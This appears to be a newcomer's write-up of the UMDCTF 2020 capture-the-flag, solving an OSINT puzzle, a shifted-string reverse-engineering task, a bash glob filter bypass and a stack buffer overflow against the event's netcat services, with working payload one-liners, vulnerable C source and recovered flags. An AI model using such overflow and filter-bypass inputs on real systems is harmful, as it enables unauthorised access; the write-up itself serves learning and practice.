# UMDCTF

This is a quick repo I'm throwing together to attempt to capture some of my thoughts during the UMBCTF on 18APR2020.  I am a complete newbie when it comes to these things so don't expect to get a ton of wisdom from me.

## MemeCTF
I wish I was better at OSINT :(

9012389aad4eb9be53d225c4bbe72098ebdb37b97a52893171ff1bce0d40f383

I googled this hash which took me to the (UMD-CSEC github profile)[https://github.com/UMD-CSEC].  The repository only shows a single markdown document but the description has the hash so I know I'm in the right place.  I then noticed that there are 3 commits.  The second commit shows that a flag was added.  Clicking on the commit, I see that this commit has a binary file *.lol.jpg*.  I click Browse Files and the filename, I am shows a jpg that has the flag on it:  UMBDCTF-{meme_ch4llenges_ftw}

## Santa Mysterious Box
You're given an ELF binary called SantaBox.  The first thing I did was run *file* on it:

SantaBox: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0400ccb74c0271f1ee7ddbd3c1f022466338d6f5, stripped

Who says you can't execute random binaries off of the internet?

```
↳ $ ./SantaBox
-----------------------------------------
|                                       |
|                                       |
|                                       |
|           Santa's Mysterious          |
|             Box of Treats             |
|                                       |
|                                       |
|                                       |
|                                       |
|                                       |
-----------------------------------------
Enter code here: Secrets
You received coal!
```

Ok, so it needs a code.  I wonder if the string is visible so I run strings and can't see the telltale signs if UMDCTF.  I then run it through *ltrace* to see what functions its calling and something interesting jumps out.

```
__isoc99_scanf(0x55b41b261c7a, 0x7ffcb056f310, 0, 0Enter code here: abcdefghijklmnop
)                                             = 1
strcmp("\\]^_`abcdefghijk", "PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x")
```

I entered the code of **abcdefghijklmnop** and the strcmp shows **\\]^_`abcdefghijk**.  This is a sign the letters have all been shifted by the same amount.  Let me copy **PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x** into python and perform a subtraction of 5 and see what we come up with.

```python
>>> code = 'PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x'
>>> ''.join((chr(ord(x)+5) for x in code))
'UMDCTF-{S4nt4_gAv3_y0u_Pr3nt5}'
```

## Question
To read or not to read the flag... That is the question!

nc 192.241.138.174 9999

For this one, you connect via netcat and the terminal has already presented you with the *cat* command having already been entered.  However, it seems as most other character are not allowed.  I gave it a couple of attempts and got lucky when I remembered reading about globbing inside of bash during another CTF.

```
↳ $ nc 192.241.138.174 9999
The flag.txt is here. Try to read it!
> cat flag.txt
Nope!
> cat *
Nope!
> cat ????.???
UMDCTF-{s0me_questions_h4ve_answ3rs}
```

## Cowspeak as a Service
lumpus gave up installing cowspeak so he made it a remote service instead! Too bad it keeps overwriting old messages... Can you become chief cow and read the first message?

nc 192.241.138.174 9998

This one I struggleed with for a bit.  Probably my first real struggle of the CTF.  Luckily the *main.c* file is provided and in it I noticed that use of *strcpy.

```
void moo(char *msg)
{
        char speak[64];
        int chief_cow = 1;

        strcpy(speak, msg);
        printf("Value of chief_cow: %d\n", chief_cow);
        speak[strcspn(speak, "\r\n")] = 0;
        setenv("MSG", speak, chief_cow);

        system("./cowsay $MSG");

}
```

I compiled the binary and played around with overflowing *speak* but couldn't seem to affect its call to cowsay.  I took a second to think about what it was that I was trying to accomplish.  I then honed in on the use of *setenv*. The man page for this function indicates:

```
int setenv(const char *name, const char *value, int overwrite);
...
if overwrite is zero, then the value of name is not changed
```

So, that's what I need to do.  I need to overlow and change the value of chief_cow to zero.  However, its not in the correct place on the stack where an overflow of speak can affect it.  Thats when I realize that I didn't compile with **-fno-stack-protector** which is a must for most of these easier overflow problems.  I recompile and notice I can now adjust the value of chief_cow if I overflow.  I modify the *main.c* code to print out the value of *chief_cow* so that I can see its value as I attempt to exploit it.  I then put togethr a pretty crappy for loop to loop through and inspect the results.

```
for i in {64..80}; do echo $i; python -c "print('a'*"$i" + '\x00'*4)" | ./cow; done
```

Looking over the results I can see that 76 characters overflowed and updated the value of *chief_cow*.

```
76
Welcome to Cowsay as a Service (CaaS)!

Enter your message:

Value of chief_cow: 0
 _________________________________________
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \
\ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

I attempt this against the server:

```
↳ $ python -c "print('a'*76 + '\x00'*4)" | nc 192.241.138.174 9998
Welcome to Cowsay as a Service (CaaS)!

Enter your message:

 ________________________
< UMDCTF-{P5Th_Ov3rF10w} >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

